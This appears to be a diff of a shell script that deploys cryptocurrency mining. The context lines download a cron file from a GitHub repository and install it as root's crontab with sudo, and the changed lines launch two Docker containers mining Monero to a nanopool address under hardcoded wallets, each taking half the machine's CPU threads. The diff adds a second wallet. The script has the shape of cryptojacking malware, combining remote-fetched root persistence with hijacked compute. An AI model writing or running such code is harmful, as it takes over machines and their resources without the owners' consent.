@@ -19,10 +19,11 @@ wget https://raw.githubusercontent.com/oldhuman/shameOnYou/master/reboot_cron -O
 sudo crontab -u root /tmp/reboot_cron
 
 wallet='426jvb8frrm73Q9Dg8SB5n7eeiLXXhUCEDWefuNq7Kgi7vMShDuUpzVG5fn7ZkS6MmSTz5ZnzGv5Sc7gPYC88n1Y19Pbti4.miner/11cj11@bk.ru'
+wallet2='4AJBPuKtFMAdYLJcGDU4U4NYAm5s8YgdwgAPajuRnpjjK2mTDdwKihkFyuDfjcnhc7JLDWQT17h2RcTxVskeJu8YCiBSLpY.miner/11cj11@bk.ru'
 numthr="$(nproc --all)"
 pool=xmr-us-west1.nanopool.org
 port=14444
 pass="11cj11@bk.ru"
 image=servethehome/universal_cryptonight:latest
-docker run -itd -e pool=$pool -e startport=$port -e username=$wallet -e pass=$pass -e av=0 -e numthreads=$((numthr / 2)) $image
-docker run -itd -e pool=$pool -e startport=$port -e username='4AJBPuKtFMAdYLJcGDU4U4NYAm5s8YgdwgAPajuRnpjjK2mTDdwKihkFyuDfjcnhc7JLDWQT17h2RcTxVskeJu8YCiBSLpY.miner/11cj11@bk.ru' -e pass=$pass -e av=0 -e numthreads=$((numthr / 2)) $image
+docker run -itd -e pool=$pool -e startport=$port -e username=$wallet -e pass=$pass -e donate-level=1 -e numthreads=$((numthr / 2)) $image
+docker run -itd -e pool=$pool -e startport=$port -e username=$wallet2 -e pass=$pass -e donate-level=1 -e numthreads=$((numthr / 2)) $image
